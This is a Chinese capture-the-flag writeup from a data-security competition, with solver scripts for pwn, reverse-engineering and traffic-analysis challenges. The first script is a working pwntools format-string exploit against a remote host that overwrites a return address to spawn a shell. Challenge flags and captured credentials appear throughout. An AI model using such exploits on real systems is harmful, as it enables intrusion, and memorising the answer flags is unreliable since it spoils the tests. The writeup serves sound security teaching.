# 第二届数据安全大赛暨首届“数信杯”东部赛区writeup

> 原文: https://www.ctfiot.com/173987.html
> ID: 173987

数据安全题

非栈上格式化字符串利用。有多次输入机会，整体思路是利用RBP多级指针改写main函数返回地址为one_gadget。需要改写8个字节，因此可以分两次写入，每次写入一个short长度。

from pwn import *
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux', 'sp' ,'-h']
#libc = ELF('./libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = process("./pb")io = remote('106.15.53.199','32829')
payload = "%11$p%13$p"io.sendlineafter("How to do?n", payload)
leak = eval(io.recv(14))info(hex(leak))
libc_start_main = leak - 240info(hex(libc_start_main))
libc_base = libc_start_main - libc.sym['__libc_start_main']info(hex(libc_base))
'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL
0x4527a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL
0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL
0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget_list = [0x45226, 0x4527a, 0xf03a4, 0xf1247]one_gadget = libc_base + one_gadget_list[3]info(hex(one_gadget))raw_input()
stack_leak_addr = eval(io.recv(14))info(hex(stack_leak_addr))
ret_addr = stack_leak_addr - 256 + 32info(hex(ret_addr))
write_in = ret_addr & 0xffffnum_len = len(str(write_in))payload = "%{}c%13$hn".format(write_in-num_len + 5)io.sendlineafter("How to do?n", payload)payload = "%{}c%39$hn".format((one_gadget & 0xffff))io.sendlineafter("How to do?n", payload)
payload = "%{}c%13$hn".format(write_in - num_len + 7)io.sendlineafter("How to do?n", payload)payload = "%{}c%39$hn".format(((one_gadget >> 16) & 0xffff))#gdb.attach(io, "b *0x400779")io.sendlineafter("How to do?n", payload)
io.sendlineafter("How to do?n", 'a'*100)
io.interactive()

base64+循环移位简单题，base64甚至没有换表。

import base64import re
with open('en_file_data.enf', 'rb') as f: data = list(f.read())
for i in range(len(data)): data[i] = ((data[i] << 5) & 0xff) | (data[i] >> 3)data = bytes(data).decode()b64 = re.findall(r'[A-Za-z0-9+/]*={0,2}', data)res = b''for x in b64: if x == '': continue x = base64.b64decode(x) res += x
with open('res', 'wb') as f: f.write(res)
res_m = [x.split(b' ') for x in res.split(b'n')]print(res_m[12-1][2-1]) # 第12行第2列

736463199528108971

re_ds002

rc4+xor简单题，rc4无魔改，两种算法的key动调可得：

from arc4 import ARC4
with open('en_file_data.enf2', 'rb') as f: data = f.read().split(b'rn')k1 = b"6A1D4E2a2276Y7JL" # from debuggingk2 = b"276Y7JB6A1D4E2A2" # from debugging
res = b''for x in data: l = list(x) for i in range(len(l)): l[i] ^= k2[i%len(k2)] rc4 = ARC4(k1) ans = rc4.encrypt(bytes(l)) res += ans
with open('res', 'wb') as f: f.write(res)
res_m = [x.split(b' ') for x in res.split(b'n')]print(res_m[8-1][2-1]) # 第8行第2列

855981200427146647

数据分析题

数据分析1

ftp 过滤一下 可直接看到 admin admin123  账户密码登录成功

<?phpecho md5('ftp+admin+admin123');flag为:458e8dbe703531b99e3381853b3134ef

统计一下STOR 可得知有101个, 特殊文件为key

<?php
echo md5('101+key');
flag为:717c0890a66bcf9524e87fdccb7d2bf4

从key.txt中可以得到arnold变换的a和b，变换后可以得到一张二维码。

import pysharkfrom PIL import Imageimport numpy as np
def get_png(): # 导出图片 cap = pyshark.FileCapture('./catcat.pcapng', display_filter="ftp-data") n = 1 for packet in cap: p = packet['TCP'].get_field('payload') if p.startswith("89:50:4e:47"): png = bytes([int(x, 16) for x in p.split(':')]) with open(f'in/{n}.png', 'wb') as f: f.write(png) n += 1 return n
def tog_png(fn): # 拼接图片 img = np.array(Image.open('in/1.png')) height, width, color = img.shape res_img = np.zeros((height*100, width, color), dtype=int) for x in range(1, 101): img = np.array(Image.open(f"in/{x}.png")) # img = np.array(Image.open(f"output/res_{x}.png")) height, width, color = img.shape for j in range(height): res_img[j+(x-1)*height] = img[j] Image.fromarray(np.uint8(res_img)).save(fn) return
def arnold(im_file, a, b, fn): img = np.array(Image.open(im_file)) height, width, color = img.shape res_img = np.zeros((height, width, color), dtype=int) for j in range(height): for i in range(width): res_img[((a*b+1)*j-a*i) % height, (-b*j+i) % width] = img[j, i] Image.fromarray(np.uint8(res_img)).save(fn) return
if __name__ == '__main__': assert get_png() == 100+1 a = 0x6f6c53 b = 0x729e tog_png('res0.png')arnold('res0.png', a, b, 'res1.png')

得到的二维码如下：

扫出来文字说是假flag。

stegsolve查看图片的各颜色通道，可以看到r0、g0、b0通道上方有黑点，说明有lsb。

lsb导出文本：

解套娃编码，Base64 -> Base32 -> unhex依次解密得到flag

import base64def get_flag(): # stegsolve导出lsb数据 lsb = "R1kzRE1RWldHRTNET04yQ0dNWlRNTlJUR00zREdNWlJHWVpER05CVEhFWlRLTVpRR00yREdNSlRIRVpUQ05SV0dZWVRNTlJUR1laVEtNWlhHTTNER09CVEdZWlRNTlJXR000VEdPSlRIQVpUQU1aV0dZWlRNTkJYSVE9PT09PT0=" b64 = base64.b64decode(lsb) b32 = base64.b32decode(b64) flag = bytes.fromhex(b32.decode()) print(flag)

flag{3f3c1b49504191faf6576866f99806cd}

数据分析2

运行如下python脚本：

table_log=[……]table_groups=[……]table_users=[……]table_api=[……]for i in range(0,len(table_log)): log=table_log[i] user_id=log[1] method=log[2].split(" ")[5].replace('"',"") api_path=log[2].split(" ")[6] group_id=table_users[user_id-1][-1] methods=table_groups[group_id-1][1] #print(methods) api_paths=table_groups[group_id-1][2] tmp_api_paths=[] for j in api_paths.split(','): tmp_api_paths.append(table_api[int(j)-1][1]) api_paths=str(tmp_api_paths) #print(api_paths) if method not in methods or api_path not in api_paths: for k in table_api: if k[1] in api_path: print(str(user_id)+"_"+str(group_id)+"_"+str(k[0])+"_"+str(i+1))

<?phpecho md5('129_3_92_3223,137_7_16_4436,423_10_26_2667,469_4_3_3917');
flag为:8634fe5ad186b44f9a7e51ac0595a768

数据分析3

<?phpecho md5('admin:admin@QWEzxc');flag为:95e1da8517497ee29e716a2835375eeb

搜索thekey ,追踪流

<?phpecho md5('webuser:1q2w3e4r5t6y');flag为:a18b8e2d1a8ee267599b04be62f0a26a

数据分析5

第二小题。观察流量发现是SQL注入，过滤http协议和IP地址，在最后发现shell.php木马文件，连接密码也很明显：


```
from pwn import *
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux', 'sp' ,'-h']
#libc = ELF('./libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = process("./pb")io = remote('106.15.53.199','32829')
payload = "%11$p%13$p"io.sendlineafter("How to do?n", payload)
leak = eval(io.recv(14))info(hex(leak))
libc_start_main = leak - 240info(hex(libc_start_main))
libc_base = libc_start_main - libc.sym['__libc_start_main']info(hex(libc_base))
'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL
0x4527a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL
0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL
0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget_list = [0x45226, 0x4527a, 0xf03a4, 0xf1247]one_gadget = libc_base + one_gadget_list[3]info(hex(one_gadget))raw_input()
stack_leak_addr = eval(io.recv(14))info(hex(stack_leak_addr))
ret_addr = stack_leak_addr - 256 + 32info(hex(ret_addr))
write_in = ret_addr & 0xffffnum_len = len(str(write_in))payload = "%{}c%13$hn".format(write_in-num_len + 5)io.sendlineafter("How to do?n", payload)payload = "%{}c%39$hn".format((one_gadget & 0xffff))io.sendlineafter("How to do?n", payload)
payload = "%{}c%13$hn".format(write_in - num_len + 7)io.sendlineafter("How to do?n", payload)payload = "%{}c%39$hn".format(((one_gadget >> 16) & 0xffff))#gdb.attach(io, "b *0x400779")io.sendlineafter("How to do?n", payload)
io.sendlineafter("How to do?n", 'a'*100)
io.interactive()
```



```
import base64import re
with open('en_file_data.enf', 'rb') as f: data = list(f.read())
for i in range(len(data)): data[i] = ((data[i] << 5) & 0xff) | (data[i] >> 3)data = bytes(data).decode()b64 = re.findall(r'[A-Za-z0-9+/]*={0,2}', data)res = b''for x in b64: if x == '': continue x = base64.b64decode(x) res += x
with open('res', 'wb') as f: f.write(res)
res_m = [x.split(b' ') for x in res.split(b'n')]print(res_m[12-1][2-1]) # 第12行第2列

736463199528108971
```



```
from arc4 import ARC4
with open('en_file_data.enf2', 'rb') as f: data = f.read().split(b'rn')k1 = b"6A1D4E2a2276Y7JL" # from debuggingk2 = b"276Y7JB6A1D4E2A2" # from debugging
res = b''for x in data: l = list(x) for i in range(len(l)): l[i] ^= k2[i%len(k2)] rc4 = ARC4(k1) ans = rc4.encrypt(bytes(l)) res += ans
with open('res', 'wb') as f: f.write(res)
res_m = [x.split(b' ') for x in res.split(b'n')]print(res_m[8-1][2-1]) # 第8行第2列

855981200427146647
```



```
<?phpecho md5('ftp+admin+admin123');flag为:458e8dbe703531b99e3381853b3134ef
```



```
<?php
echo md5('101+key');
flag为:717c0890a66bcf9524e87fdccb7d2bf4
```



```
import pysharkfrom PIL import Imageimport numpy as np
def get_png(): # 导出图片 cap = pyshark.FileCapture('./catcat.pcapng', display_filter="ftp-data") n = 1 for packet in cap: p = packet['TCP'].get_field('payload') if p.startswith("89:50:4e:47"): png = bytes([int(x, 16) for x in p.split(':')]) with open(f'in/{n}.png', 'wb') as f: f.write(png) n += 1 return n
def tog_png(fn): # 拼接图片 img = np.array(Image.open('in/1.png')) height, width, color = img.shape res_img = np.zeros((height*100, width, color), dtype=int) for x in range(1, 101): img = np.array(Image.open(f"in/{x}.png")) # img = np.array(Image.open(f"output/res_{x}.png")) height, width, color = img.shape for j in range(height): res_img[j+(x-1)*height] = img[j] Image.fromarray(np.uint8(res_img)).save(fn) return
def arnold(im_file, a, b, fn): img = np.array(Image.open(im_file)) height, width, color = img.shape res_img = np.zeros((height, width, color), dtype=int) for j in range(height): for i in range(width): res_img[((a*b+1)*j-a*i) % height, (-b*j+i) % width] = img[j, i] Image.fromarray(np.uint8(res_img)).save(fn) return
if __name__ == '__main__': assert get_png() == 100+1 a = 0x6f6c53 b = 0x729e tog_png('res0.png')arnold('res0.png', a, b, 'res1.png')
```



```
import base64def get_flag(): # stegsolve导出lsb数据 lsb = "R1kzRE1RWldHRTNET04yQ0dNWlRNTlJUR00zREdNWlJHWVpER05CVEhFWlRLTVpRR00yREdNSlRIRVpUQ05SV0dZWVRNTlJUR1laVEtNWlhHTTNER09CVEdZWlRNTlJXR000VEdPSlRIQVpUQU1aV0dZWlRNTkJYSVE9PT09PT0=" b64 = base64.b64decode(lsb) b32 = base64.b32decode(b64) flag = bytes.fromhex(b32.decode()) print(flag)

flag{3f3c1b49504191faf6576866f99806cd}
```



```
table_log=[……]table_groups=[……]table_users=[……]table_api=[……]for i in range(0,len(table_log)): log=table_log[i] user_id=log[1] method=log[2].split(" ")[5].replace('"',"") api_path=log[2].split(" ")[6] group_id=table_users[user_id-1][-1] methods=table_groups[group_id-1][1] #print(methods) api_paths=table_groups[group_id-1][2] tmp_api_paths=[] for j in api_paths.split(','): tmp_api_paths.append(table_api[int(j)-1][1]) api_paths=str(tmp_api_paths) #print(api_paths) if method not in methods or api_path not in api_paths: for k in table_api: if k[1] in api_path: print(str(user_id)+"_"+str(group_id)+"_"+str(k[0])+"_"+str(i+1))
```



```
<?phpecho md5('129_3_92_3223,137_7_16_4436,423_10_26_2667,469_4_3_3917');
flag为:8634fe5ad186b44f9a7e51ac0595a768
```



```
<?phpecho md5('admin:admin@QWEzxc');flag为:95e1da8517497ee29e716a2835375eeb
```



```
<?phpecho md5('webuser:1q2w3e4r5t6y');flag为:a18b8e2d1a8ee267599b04be62f0a26a
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1713258320.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1713258320.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/8-1713258320.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1713258321.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1713258321.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1713258322.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1713258322.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1713258323.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1713258324.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1713258325.png)